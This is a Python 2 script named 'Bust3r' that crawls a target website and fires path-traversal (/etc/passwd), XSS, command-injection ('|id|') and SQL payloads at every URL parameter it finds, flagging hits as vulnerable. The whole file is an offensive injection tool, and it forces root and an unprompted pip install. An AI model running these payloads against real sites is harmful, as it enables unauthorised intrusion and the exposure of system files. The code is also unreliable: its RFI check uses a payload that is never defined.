#!/usr/bin/env python
# -*- coding: UTF-8 -*-
from sgmllib import SGMLParser
import os, sys, urllib, httplib, re, urllib2, sets, socket, subprocess, ConfigParser
from termcolor import colored
os.system("pip install colored")

if not os.geteuid() == 0:
	sys.exit('Script must be run as root')

os.system('cls' if os.name == 'nt' else 'clear')


COLOR_BLACK     = 0
COLOR_RED       = 1
COLOR_GREEN     = 2
COLOR_YELLOW    = 3
COLOR_BLUE      = 4
COLOR_PINK      = 5
COLOR_CYAN      = 6
COLOR_WHITE     = 7
COLOR_RESET     = 9

#os.system("firefox")
#os.system("iceweasle")			#Comment out what you don't have
#os.system("chrome")
print colored("""
 ▄▄▄▄    █    ██   ██████ ▄▄▄█████▓▓█████  ██▀███     
▓█████▄  ██  ▓██▒▒██    ▒ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒   
▒██▒ ▄██▓██  ▒██░░ ▓██▄   ▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒   
▒██░█▀  ▓▓█  ░██░  ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄     
░▓█  ▀█▓▒▒█████▓ ▒██████▒▒  ▒██▒ ░ ░▒████▒░██▓ ▒██▒   
░▒▓███▀▒░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░  ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░   
▒░▒   ░ ░░▒░ ░ ░ ░ ░▒  ░ ░    ░     ░ ░  ░  ░▒ ░ ▒░   
 ░    ░  ░░░ ░ ░ ░  ░  ░    ░         ░     ░░   ░    
 ░         ░           ░              ░  ░   ░        
      ░                                             
       """,'blue')
                         
print """
~~=[ Bust3r - XSS, SQL, LFI, RFI Injector 
~~=[ v1.4 - 'DarkMass'"""
print colored("~~=[ coders: @0x232A, @DrDeadPatch",'cyan')
print colored("~~=[ https://github.com/r0otshell, https://github.com/LucidScorpion",'yellow')
socket.setdefaulttimeout(5)

class URLLister(SGMLParser):
   def reset(self):
      SGMLParser.reset(self)
      self.urls = []
 
   def start_a(self, attrs):
      href = [v for k, v in attrs if k=='href']
      if href:
         self.urls.extend(href)
 
def parse_urls(links):
   urls = []
   for link in links: 
      num = link.count("=")
      if num > 0:
         for x in xrange(num):
            x = x+1
            if link[0] == "/" or link[0] == "?":
               url = site+link.rsplit("=",x)[0]+"="
            else:
               url = link.rsplit("=",x)[0]+"="
            if url.find(site.split(".",1)[1]) == -1:
               url = site+url
            if url.count("//") > 1:
               url = "http://"+url[7:].replace("//","/",1)
            urls.append(url)
   urls = list(sets.Set(urls))
   return urls
 
def main(host): 
   print "\n\t[+] Testing:",host,"\n"
   try: 
      if verbose == 1:
         print "[+] Checking XSS" 
      xss(host) 
   except(urllib2.HTTPError, urllib2.URLError), msg:
      #print "[-] XSS Error:",msg 
      pass
   try:
      if verbose == 1:
         print "[+] Checking LFI" 
      lfi(host) 
   except(urllib2.HTTPError, urllib2.URLError), msg: 
      #print "[-] LFI Error:",msg 
      pass
   try:
      if verbose == 1:
         print "[+] Checking RFI" 
      rfi(host) 
   except(urllib2.HTTPError, urllib2.URLError), msg: 
      #print "[-] RFI Error:",msg 
      pass
   try:
      if verbose == 1:
         print "[+] Checking CMD" 
      cmd(host) 
   except(urllib2.HTTPError, urllib2.URLError), msg: 
      #print "[-] CMD Error:",msg 
      pass 
   try:
      if verbose == 1:
         print "[+] Checking SQL" 
      sql(host) 
   except(urllib2.HTTPError, urllib2.URLError), msg: 
      #print "[-] SQL Error:",msg 
      pass 
 
def rfi(host): 
 
   try: 
      source = urllib2.urlopen(host+RFI).read() 
      if re.search("r57shell", source): #using a different shell change this line
         print "[+] RFI:",host+RFI
      else: 
         if verbose == 1:
            print "[-] Not Vuln." 
   except(),msg: 
      #print "[-] Error Occurred",msg 
      pass 
 
def xss(host): 
   source = urllib2.urlopen(host+XSS).read() 
   if re.search("XSS", source) != None: 
      print "[!] XSS:",host+XSS 
   else: 
      if verbose == 1:
         print "[-] Not Vuln." 
 
def sql(host):
   for pload in SQL:
      source = urllib2.urlopen(host+pload).read() 
      if re.search("Warning:", source) != None: 
         print "[!] SQL:",host+pload
      else: 
         if verbose == 1:
            print "[-] Not Vuln."
 
def cmd(host): 
   source = urllib2.urlopen(host+CMD).read() 
   if re.search("uid=", source) != None: 
      print "[!] CMD:",host+CMD 
   else: 
      if verbose == 1:
         print "[-] Not Vuln." 
 
def lfi(host): 
 
   source = urllib2.urlopen(host+LFI).read() 
   if re.search("root:", source) != None: 
      print "[!] LFI:",host+LFI 
   else: 
      if verbose == 1:
         print "[-] Not Vuln." 
   source = urllib2.urlopen(host+LFI+"%00").read() 
   if re.search("root:", source) != None: 
      print "[!] LFI:",host+LFI+"%00" 
   else: 
      if verbose == 1:
         print "[-] Not Vuln. w/  Null Byte" 

 
if len(sys.argv) not in [2,3]:
   print ""
   print colored("Usage : ./bust3r.py <site> [option]",'red')
   print "\t[Option]"
   print "\t-verbose/-v | Verbose Output\n"
   print "Example:" 
   print colored("\t./bust3r.py [url] -verbose", 'white')
   print ""
   sys.exit(1)

LFI = "../../../../../../../../../../../../etc/passwd" 
XSS = "%22%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E" 
CMD = "|id|"
SQL = ["-1","999999"] #Add more or change sql payloads
 
site = sys.argv[1].replace("\n","")
print "\n[+] Collecting:",site
try:
   if sys.argv[2].lower() == "-v" or sys.argv[2].lower() == "-verbose":
      verbose = 1
      print colored("[+] Verbose Mode On\n",'yellow')
except(IndexError):
   print "[-] Verbose Mode Off\n"
   verbose = 0
   pass
site = site.replace("http://","").rsplit("/",1)[0]+"/"
site = "http://"+site.lower()
try:
   usock = urllib.urlopen(site)
   parser = URLLister()
   parser.feed(usock.read().lower())
   parser.close()
   usock.close()
except(IOError, urllib2.URLError), msg: 
   print "[-] Error Connecting to",site
   print "[-]",msg
   sys.exit(1)
urls = parse_urls(parser.urls)
print "[+] Links Found:",len(urls)
for url in urls: 
   try:
      main(url)
   except(KeyboardInterrupt):
      pass
print "\n[-] Done\n"
